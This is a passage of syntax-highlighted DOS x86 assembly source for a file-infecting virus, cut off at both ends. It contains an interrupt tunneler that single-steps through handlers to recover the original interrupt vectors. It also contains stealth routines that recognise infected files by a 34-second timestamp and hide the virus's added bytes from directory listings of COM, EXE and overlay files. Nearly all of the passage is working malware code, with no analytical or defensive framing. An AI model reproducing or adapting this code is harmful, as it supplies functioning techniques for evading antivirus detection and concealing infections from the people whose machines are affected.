         </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc0">          </span><span class="sc1">; Load ES from stack (CS)</span><span class="sc0">

         </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc5">int_addr</span><span class="sc0">     </span><span class="sc1">; DI = offset of int_addr</span><span class="sc0">
         </span><span class="sc6">movsw</span><span class="sc0">           </span><span class="sc1">; Get interrupt vector</span><span class="sc0">
         </span><span class="sc6">movsw</span><span class="sc0">           </span><span class="sc1">;  "      "       "</span><span class="sc0">

         </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">       </span><span class="sc1">; Load registers from stack</span><span class="sc0">

         </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">        </span><span class="sc1">; Load registers from stack</span><span class="sc0">

         </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc2">06h</span><span class="sc4">]</span><span class="sc0">        </span><span class="sc1">; Save flags at stack</span><span class="sc0">
         </span><span class="sc6">popf</span><span class="sc0">            </span><span class="sc1">; Load flags from stack</span><span class="sc0">

         </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">bp</span><span class="sc0">          </span><span class="sc1">; Load BP from stack</span><span class="sc0">

         </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0eah</span><span class="sc0">        </span><span class="sc1">; JMP imm32 (opcode 0eah)</span><span class="sc0">
</span><span class="sc5">int_addr</span><span class="sc0">     </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">           </span><span class="sc1">; Address of interrupt</span><span class="sc0">
</span><span class="sc5">test_int03</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0cch</span><span class="sc0">         </span><span class="sc1">; INT 03h (opcode 0cch)?</span><span class="sc0">
         </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">tunnel_exit</span><span class="sc0">     </span><span class="sc1">; Not equal? Jump to tunnel_exit</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc2">02h</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; AX = instruction pointer of inte...</span><span class="sc0">
         </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">          </span><span class="sc1">; Increase AX</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc2">02h</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">     </span><span class="sc1">; Store instruction pointer of int...</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">03cdh</span><span class="sc0">        </span><span class="sc1">; INT 03h (opcode 0cdh,03h)</span><span class="sc0">

         </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">int_simulati</span><span class="sc0">
</span><span class="sc5">code_seg_tst</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">       </span><span class="sc1">; Load registers from stack</span><span class="sc0">

         </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">bp</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">       </span><span class="sc1">; Save registers at stack</span><span class="sc0">

         </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">bp</span><span class="sc4">,</span><span class="sc5">int24_exit</span><span class="sc0">   </span><span class="sc1">; BP = offset of int24_exit</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc8">bp</span><span class="sc0">       </span><span class="sc1">; DS =   "    "      "</span><span class="sc0">
         </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">bp</span><span class="sc4">,</span><span class="sc5">tunneler</span><span class="sc0">     </span><span class="sc1">; BP = offset of tunneler</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">exam_mod_reg</span><span class="sc0">

         </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">          </span><span class="sc1">; Load DS from stack</span><span class="sc0">

         </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">test_cs_seg_</span><span class="sc0">
</span><span class="sc5">zero_seg_tst</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">       </span><span class="sc1">; Load registers from stack</span><span class="sc0">

         </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">bp</span><span class="sc0">          </span><span class="sc1">; Save BP at stack</span><span class="sc0">

         </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc0">          </span><span class="sc1">; Save DS at stack</span><span class="sc0">

         </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">bp</span><span class="sc4">,</span><span class="sc5">int01_addr</span><span class="sc0">   </span><span class="sc1">; BP = offset of int01_addr</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc8">bp</span><span class="sc0">       </span><span class="sc1">; DS =   "    "      "</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bp</span><span class="sc4">,(</span><span class="sc2">01h</span><span class="sc4">*</span><span class="sc2">04h</span><span class="sc4">)</span><span class="sc0">    </span><span class="sc1">; BP = offset of interrupt vector 01h</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">exam_mod_reg</span><span class="sc0">

         </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">          </span><span class="sc1">; Load DS from stack</span><span class="sc0">

         </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">bp</span><span class="sc4">,</span><span class="sc2">05h</span><span class="sc0">      </span><span class="sc1">; Found offset of interrupt table?</span><span class="sc0">
         </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">tst_data_seg</span><span class="sc0">    </span><span class="sc1">; Equal? Jump to tst_data_seg</span><span class="sc0">

         </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">test_cs_seg_</span><span class="sc0">
</span><span class="sc5">tst_data_seg</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">          </span><span class="sc1">; Save AX at stack</span><span class="sc0">

         </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0">          </span><span class="sc1">; Save CS at stack</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc0">       </span><span class="sc1">; AX = data segment</span><span class="sc0">
         </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">       </span><span class="sc1">; Segment of interrupt vector table?</span><span class="sc0">
         </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">mov_cs_to_ds</span><span class="sc0">    </span><span class="sc1">; Zero? Jump to mov_cs_to_ds</span><span class="sc0">

         </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc0">          </span><span class="sc1">; Load ES from stack (CS)</span><span class="sc0">

         </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">jump_test_cs</span><span class="sc0">

         </span><span class="sc6">nop</span><span class="sc0">
</span><span class="sc5">mov_cs_to_ds</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">          </span><span class="sc1">; Load DS from stack (CS)</span><span class="sc0">
</span><span class="sc5">jump_test_cs</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">          </span><span class="sc1">; Load AX from stack</span><span class="sc0">

         </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">test_cs_seg_</span><span class="sc0">
</span><span class="sc5">pushf_simula</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc2">02h</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; AX = instruction pointer of inte...</span><span class="sc0">
         </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">          </span><span class="sc1">; Increase AX</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc2">02h</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">     </span><span class="sc1">; Store instruction pointer of int...</span><span class="sc0">

         </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">di</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">       </span><span class="sc1">; Save registers at stack</span><span class="sc0">

         </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ss</span><span class="sc0">          </span><span class="sc1">; Save SS at stack</span><span class="sc0">
         </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">          </span><span class="sc1">; Load DS from stack (SS)</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">sp</span><span class="sc0">       </span><span class="sc1">; SI = stack pointer</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">bp</span><span class="sc0">       </span><span class="sc1">; DI = stack pointer</span><span class="sc0">
         </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc2">08h</span><span class="sc0">      </span><span class="sc1">; DI = offset of end of stack</span><span class="sc0">
</span><span class="sc5">move_stack_</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">lodsw</span><span class="sc0">           </span><span class="sc1">; AL = word of stack</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">-</span><span class="sc2">04h</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">     </span><span class="sc1">; Store word of stack</span><span class="sc0">

         </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">di</span><span class="sc0">       </span><span class="sc1">; End of stack?</span><span class="sc0">
         </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">move_stack_</span><span class="sc0">     </span><span class="sc1">; Not equal? Jump to move_stack_</span><span class="sc0">

         </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">sp</span><span class="sc0">          </span><span class="sc1">; Decrease SP</span><span class="sc0">
         </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">sp</span><span class="sc0">          </span><span class="sc1">;    "     "</span><span class="sc0">

         </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">       </span><span class="sc1">; Load registers from stack</span><span class="sc0">

         </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc2">04h</span><span class="sc4">]</span><span class="sc0">        </span><span class="sc1">; Save flags at stack</span><span class="sc0">
         </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc2">06h</span><span class="sc4">]</span><span class="sc0">        </span><span class="sc1">; Load flags from stack</span><span class="sc0">

         </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc2">06h</span><span class="sc4">],</span><span class="sc2">1111111011111111b</span><span class="sc0">

         </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">        </span><span class="sc1">; Load registers from stack</span><span class="sc0">

         </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">test_cs_seg_</span><span class="sc0">

</span><span class="sc5">test_segment</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0">    </span><span class="sc10">near</span><span class="sc0">        </span><span class="sc1">; Test data- and extra segment</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc0">       </span><span class="sc1">; AX = data segment</span><span class="sc0">
         </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">       </span><span class="sc1">; Equal to data segment</span><span class="sc0">
         </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">test_es_seg</span><span class="sc0">     </span><span class="sc1">; Not equal? Jump to test_es_seg</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bh</span><span class="sc4">,</span><span class="sc2">01h</span><span class="sc0">      </span><span class="sc1">; Segment found</span><span class="sc0">

         </span><span class="sc6">ret</span><span class="sc0">             </span><span class="sc1">; Return!</span><span class="sc0">
</span><span class="sc5">test_es_seg</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">es</span><span class="sc0">       </span><span class="sc1">; AX = extra segment</span><span class="sc0">
         </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">       </span><span class="sc1">; Equal to extra segment?</span><span class="sc0">
         </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">not_equal</span><span class="sc0">       </span><span class="sc1">; Not equal? Jump to not_equal</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bh</span><span class="sc4">,</span><span class="sc2">01h</span><span class="sc0">      </span><span class="sc1">; Segment found</span><span class="sc0">

         </span><span class="sc6">ret</span><span class="sc0">             </span><span class="sc1">; Return!</span><span class="sc0">
</span><span class="sc5">not_equal</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bh</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0">      </span><span class="sc1">; Segment not found</span><span class="sc0">

         </span><span class="sc6">ret</span><span class="sc0">             </span><span class="sc1">; Return!</span><span class="sc0">
         </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc5">exam_mod_reg</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0">    </span><span class="sc10">near</span><span class="sc0">        </span><span class="sc1">; Examine and if found, modify reg...</span><span class="sc0">
         </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">bp</span><span class="sc0">       </span><span class="sc1">; Equal to test register value?</span><span class="sc0">
         </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">exam_bx_reg</span><span class="sc0">     </span><span class="sc1">; Not equal? Jump to exam_bx_reg</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc0">       </span><span class="sc1">; AX = new register value</span><span class="sc0">

         </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">found_reg</span><span class="sc0">

         </span><span class="sc6">nop</span><span class="sc0">
</span><span class="sc5">exam_bx_reg</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">bp</span><span class="sc0">       </span><span class="sc1">; Equal to test register value?</span><span class="sc0">
         </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">exam_cx_reg</span><span class="sc0">     </span><span class="sc1">; Not equal? Jump to exam_cx_reg</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc0">       </span><span class="sc1">; BX = new register value</span><span class="sc0">

         </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">found_reg</span><span class="sc0">

         </span><span class="sc6">nop</span><span class="sc0">
</span><span class="sc5">exam_cx_reg</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">bp</span><span class="sc0">       </span><span class="sc1">; Equal to test register value?</span><span class="sc0">
         </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">exam_dx_reg</span><span class="sc0">     </span><span class="sc1">; Not equal? Jump to exam_dx_reg</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc0">       </span><span class="sc1">; CX = new register value</span><span class="sc0">

         </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">found_reg</span><span class="sc0">

         </span><span class="sc6">nop</span><span class="sc0">
</span><span class="sc5">exam_dx_reg</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">bp</span><span class="sc0">       </span><span class="sc1">; Equal to test register value?</span><span class="sc0">
         </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">exam_si_reg</span><span class="sc0">     </span><span class="sc1">; Not equal? Jump to exam_si_reg</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc0">       </span><span class="sc1">; DX = new register value</span><span class="sc0">

         </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">found_reg</span><span class="sc0">

         </span><span class="sc6">nop</span><span class="sc0">
</span><span class="sc5">exam_si_reg</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">bp</span><span class="sc0">       </span><span class="sc1">; Equal to test register value?</span><span class="sc0">
         </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">exam_di_reg</span><span class="sc0">     </span><span class="sc1">; Not equal? Jump to exam_di_reg</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc0">       </span><span class="sc1">; SI = new register value</span><span class="sc0">

         </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">found_reg</span><span class="sc0">

         </span><span class="sc6">nop</span><span class="sc0">
</span><span class="sc5">exam_di_reg</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">bp</span><span class="sc0">       </span><span class="sc1">; Equal to test register value?</span><span class="sc0">
         </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">exam_reg_xit</span><span class="sc0">    </span><span class="sc1">; Not equal? Jump to exam_reg_xit</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc0">       </span><span class="sc1">; DI = new register value</span><span class="sc0">
</span><span class="sc5">found_reg</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">bp</span><span class="sc0">          </span><span class="sc1">; BP = found test register value</span><span class="sc0">
</span><span class="sc5">exam_reg_xit</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">ret</span><span class="sc0">             </span><span class="sc1">; Return!</span><span class="sc0">
         </span><span class="sc9">endp</span><span class="sc0">
         </span><span class="sc9">endp</span><span class="sc0">
</span><span class="sc5">dta_stealth</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">int21_simula</span><span class="sc0">
         </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">dta_ste_exit</span><span class="sc0">    </span><span class="sc1">; Error? Jump to dta_ste_exit</span><span class="sc0">

         </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">   </span><span class="sc1">; Save registers at stack</span><span class="sc0">

         </span><span class="sc6">cld</span><span class="sc0">             </span><span class="sc1">; Clear direction flag</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">2fh</span><span class="sc0">      </span><span class="sc1">; Get disk transfer area address</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">int21_simula</span><span class="sc0">

         </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">es</span><span class="sc0">          </span><span class="sc1">; Save ES at stack</span><span class="sc0">
         </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">          </span><span class="sc1">; Load DS from stack (ES)</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">       </span><span class="sc1">; SI = offset of disk transfer area</span><span class="sc0">
         </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc2">16h</span><span class="sc0">      </span><span class="sc1">; SI = offset of file time</span><span class="sc0">
         </span><span class="sc6">lodsb</span><span class="sc0">           </span><span class="sc1">; AL = file time</span><span class="sc0">

         </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">00011111b</span><span class="sc0">    </span><span class="sc1">; AL = seconds of file time</span><span class="sc0">
         </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">00010001b</span><span class="sc0">    </span><span class="sc1">; Infected (34 seconds)?</span><span class="sc0">
         </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">dta_dont_ste</span><span class="sc0">    </span><span class="sc1">; Not infected? Jump to dta_dont_ste</span><span class="sc0">

         </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc2">07h</span><span class="sc0">      </span><span class="sc1">; SI = offset of filename</span><span class="sc0">

         </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">si</span><span class="sc0">          </span><span class="sc1">; Save SI at stack</span><span class="sc0">
</span><span class="sc5">find_zero</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">lodsb</span><span class="sc0">           </span><span class="sc1">; AL = byte of filename</span><span class="sc0">
         </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0">      </span><span class="sc1">; End of filename?</span><span class="sc0">
         </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">find_zero</span><span class="sc0">       </span><span class="sc1">; Not equal? Jump to find_zero</span><span class="sc0">

         </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc2">04h</span><span class="sc0">      </span><span class="sc1">; SI = offset of extension</span><span class="sc0">
         </span><span class="sc6">lodsb</span><span class="sc0">           </span><span class="sc1">; AL = byte of filename</span><span class="sc0">
         </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc0">          </span><span class="sc1">; Load SI from stack</span><span class="sc0">

         </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">01011111b</span><span class="sc0">    </span><span class="sc1">; Upcase character</span><span class="sc0">
         </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc12">'E'</span><span class="sc0">              </span><span class="sc1">; EXE executable?</span><span class="sc0">
         </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">dta_e_o_test</span><span class="sc0">    </span><span class="sc1">; Equal? Jump to dta_e_o_test</span><span class="sc0">
         </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc12">'O'</span><span class="sc0">              </span><span class="sc1">; Overlay executable?</span><span class="sc0">
         </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">dta_e_o_test</span><span class="sc0">    </span><span class="sc1">; Equal? Jump to dta_e_o_test</span><span class="sc0">
         </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc12">'C'</span><span class="sc0">              </span><span class="sc1">; COM executable?</span><span class="sc0">
         </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">dta_dont_ste</span><span class="sc0">    </span><span class="sc1">; Not equal? Jump to dta_dont_ste</span><span class="sc0">

         </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">-</span><span class="sc2">04h</span><span class="sc4">],(</span><span class="sc5">code_end</span><span class="sc4">-</span><span class="sc5">code_begin</span><span class="sc4">)*</span><span class="sc2">02h</span><span class="sc4">+</span><span class="sc2">100h</span><span class="sc0">
         </span><span class="sc6">jb</span><span class="sc0">      </span><span class="sc5">dta_dont_ste</span><span class="sc0">    </span><span class="sc1">; Filesize too small? Jump to dta_...</span><span class="sc0">

         </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">-</span><span class="sc2">04h</span><span class="sc4">],(</span><span class="sc5">code_end</span><span class="sc4">-</span><span class="sc5">code_begin</span><span class="sc4">)</span><span class="sc0">

         </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">dta_dont_ste</span><span class="sc0">
</span><span class="sc5">dta_e_o_test</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">-</span><span class="sc2">02h</span><span class="sc4">],</span><span class="sc2">00h</span><span class="sc0">
         </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">dta_e_o_stea</span><span class="sc0">    </span><span class="sc1">; Filesize not too small? Jump to ...</span><span class="sc0">
         </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">-</span><span class="sc2">04h</span><span class="sc4">],(</span><span class="sc5">code_end</span><span class="sc4">-</span><span class="sc5">code_begin</span><span class="sc4">)*</span><span class="sc2">02h</span><span class="sc4">+</span><span class="sc2">100h</span><span class="sc0">
         </span><span class="sc6">jb</span><span class="sc0">      </span><span class="sc5">dta_dont_ste</span><span class="sc0">    </span><span class="sc1">; Filesize too small? Jump to dta_...</span><span class="sc0">
</span><span class="sc5">dta_e_o_stea</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">-</span><span class="sc2">04h</span><span class="sc4">],(</span><span class="sc5">code_end</span><span class="sc4">-</span><span class="sc5">code_begin</span><span class="sc4">+</span><span class="sc2">110h</span><span class="sc4">)</span><span class="sc0">
         </span><span class="sc6">sbb</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">-</span><span class="sc2">02h</span><span class="sc4">],</span><span class="sc2">00h</span><span class="sc0">
</span><span class="sc5">dta_dont_ste</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">   </span><span class="sc1">; Load registers from stack</span><span class="sc0">

         </span><span class="sc6">clc</span><span class="sc0">             </span><span class="sc1">; Clear carry flag</span><span class="sc0">
</span><span class="sc5">dta_ste_exit</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">retf</span><span class="sc0">    </span><span class="sc2">02h</span><span class="sc0">         </span><span class="sc1">; Return far and pop a word!</span><span class="sc0">
</span><span class="sc5">fcb_stealth</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">int21_simula</span><span class="sc0">
         </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0">      </span><span class="sc1">; Match not found?</span><span class="sc0">
